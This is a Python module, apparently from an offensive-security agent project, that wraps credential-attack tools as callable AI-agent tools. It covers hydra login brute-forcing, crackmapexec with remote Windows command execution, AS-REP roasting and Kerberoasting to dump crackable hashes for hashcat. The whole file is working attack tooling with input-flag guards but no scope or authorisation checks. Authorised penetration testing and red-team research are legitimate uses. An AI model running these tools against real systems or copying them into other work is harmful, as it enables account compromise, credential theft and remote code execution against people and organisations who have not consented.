"""Credential attack tool wrappers.

hydra, crackmapexec (netexec), impacket-GetNPUsers (AS-REP roasting),
impacket-GetUserSPNs (Kerberoasting).
"""

from __future__ import annotations

from langchain_core.tools import tool

from decepticon.kali_tools._common import (
    FlagInjectionError,
    arun_command,
    assert_not_flag,
    format_result,
    scratch_file,
)


def _flag_error(tool_name: str, reason: str) -> str:
    import json as _json

    return _json.dumps(
        {"ok": False, "error": f"{tool_name}: {reason}"},
        indent=2,
    )


@tool
async def hydra_brute(
    target: str,
    service: str,
    userlist: str,
    passlist: str,
    port: int = 0,
    threads: int = 8,
    timeout: float = 1800.0,
) -> str:
    """Run ``hydra`` for online login brute-force.

    Args:
        target: host or IP of the service.
        service: protocol (ssh, ftp, smb, http-post-form, rdp, ...).
        userlist: path to username wordlist.
        passlist: path to password wordlist.
        port: override default service port (0 = default).
        threads: parallel tasks.
    """
    try:
        assert_not_flag(target, field="target")
        assert_not_flag(service, field="service")
        assert_not_flag(userlist, field="userlist")
        assert_not_flag(passlist, field="passlist")
    except FlagInjectionError as e:
        return _flag_error("hydra", str(e))
    out = scratch_file(".txt")
    argv = [
        "hydra",
        "-L",
        userlist,
        "-P",
        passlist,
        "-t",
        str(threads),
        "-o",
        str(out),
    ]
    if port:
        argv.extend(["-s", str(port)])
    argv.extend(["--", target, service])
    result = await arun_command(argv, timeout=timeout)
    result.output_path = str(out)
    return format_result(result, extra={"target": target, "service": service})


@tool
async def crackmapexec_run(
    protocol: str,
    target: str,
    username: str = "",
    password: str = "",
    ntlm_hash: str = "",
    module: str = "",
    command: str = "",
    timeout: float = 900.0,
) -> str:
    """Run ``crackmapexec`` (or its successor ``netexec``) against a target.

    ``protocol`` is one of ``smb``, ``winrm``, ``ldap``, ``mssql``,
    ``ssh``, etc. Provide either ``password`` or ``ntlm_hash`` for
    authentication. ``module`` runs a named CME module; ``command``
    shells a Windows command via the remote transport.
    """
    try:
        assert_not_flag(protocol, field="protocol")
        assert_not_flag(target, field="target")
        if username:
            assert_not_flag(username, field="username")
        if module:
            assert_not_flag(module, field="module")
        # password/ntlm_hash/command MAY legitimately contain tricky
        # characters but must not begin with a flag marker
        if ntlm_hash:
            assert_not_flag(ntlm_hash, field="ntlm_hash")
    except FlagInjectionError as e:
        return _flag_error("crackmapexec", str(e))
    binary = "crackmapexec"
    argv: list[str] = [binary, protocol, target]
    if username:
        argv.extend(["-u", username])
    if password:
        argv.extend(["-p", password])
    if ntlm_hash:
        argv.extend(["-H", ntlm_hash])
    if module:
        argv.extend(["-M", module])
    if command:
        argv.extend(["-x", command])
    result = await arun_command(argv, timeout=timeout)
    return format_result(result, extra={"protocol": protocol, "target": target})


@tool
async def getnpusers_asrep(
    domain: str,
    dc_ip: str,
    usersfile: str = "",
    username: str = "",
    request: bool = True,
    timeout: float = 300.0,
) -> str:
    """Run ``impacket-GetNPUsers`` for AS-REP roasting.

    Dumps crackable hashes for users without Kerberos pre-auth. Output
    is written to a scratch file so ``hashcat -m 18200`` can pick it
    up directly.
    """
    try:
        assert_not_flag(domain, field="domain")
        assert_not_flag(dc_ip, field="dc_ip")
        if username:
            assert_not_flag(username, field="username")
        if usersfile:
            assert_not_flag(usersfile, field="usersfile")
    except FlagInjectionError as e:
        return _flag_error("getnpusers", str(e))
    out = scratch_file(".asrep")
    target = f"{domain}/"
    if username:
        target = f"{domain}/{username}"
    argv = ["impacket-GetNPUsers", target, "-dc-ip", dc_ip, "-outputfile", str(out), "-no-pass"]
    if usersfile and not username:
        argv.extend(["-usersfile", usersfile])
    if request:
        argv.append("-request")
    result = await arun_command(argv, timeout=timeout)
    result.output_path = str(out)
    return format_result(result, extra={"domain": domain, "dc_ip": dc_ip})


@tool
async def getuserspns_kerberoast(
    domain: str,
    username: str,
    password: str,
    dc_ip: str,
    timeout: float = 300.0,
) -> str:
    """Run ``impacket-GetUserSPNs`` for Kerberoasting.

    Requires any valid AD user's credentials. Dumps SPN tickets for
    crackable service accounts. Output is written to a scratch file
    for ``hashcat -m 13100``.
    """
    try:
        assert_not_flag(domain, field="domain")
        assert_not_flag(username, field="username")
        assert_not_flag(dc_ip, field="dc_ip")
    except FlagInjectionError as e:
        return _flag_error("getuserspns", str(e))
    out = scratch_file(".kerberoast")
    argv = [
        "impacket-GetUserSPNs",
        f"{domain}/{username}:{password}",
        "-dc-ip",
        dc_ip,
        "-request",
        "-outputfile",
        str(out),
    ]
    result = await arun_command(argv, timeout=timeout)
    result.output_path = str(out)
    return format_result(result, extra={"domain": domain, "username": username, "dc_ip": dc_ip})


CREDENTIAL_TOOLS = [
    hydra_brute,
    crackmapexec_run,
    getnpusers_asrep,
    getuserspns_kerberoast,
]

__all__ = ["CREDENTIAL_TOOLS"]
